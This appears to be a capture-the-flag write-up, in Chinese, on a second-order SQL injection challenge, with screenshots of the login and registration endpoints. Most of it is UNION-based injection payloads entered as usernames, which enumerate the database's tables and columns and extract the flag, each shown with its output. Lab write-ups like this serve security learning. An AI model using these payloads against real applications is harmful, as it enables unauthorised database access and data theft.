![[Pasted image 20230209095656.png|500]]

```
/?action=login
```

![[Pasted image 20230209095849.png|400]]

```
/?action=reg
```

![[Pasted image 20230209100007.png|400]]

```
/?action=index
```

![[Pasted image 20230209100928.png|400]]

题目明示是二次注入，而唯一的回显点是`info`

对`info`的注入没有什么收获，估计在写入的时候做了转义，而又没有其他情况是需要`info`拼接入查询的

因而注入点大底只可能是`username`了

推测对`info`的查询实现如下

```sql
SELECT INFO FROM USERS WHERE USERNAME = '$username';
```

尝试对用户名进行联合注入

```
username: ' union select database()#
password: 
```

![[Pasted image 20230209102931.png|400]]

```
username: ' union select group_concat(table_name) from information_schema.tables where table_schema = 'ctftraining'#
password: 
```

```
flag,news,users
```

```
username: ' union select group_concat(column_name) from information_schema.columns where table_name = 'flag'#
password: 
```

```
flag
```

```
username: ' union select group_concat(flag) from flag#
password: 
```

```
flag{0ee8b261-5b74-4931-8c2e-aa9cf771b6d5}
```

#Web #SQL注入 #二次注入 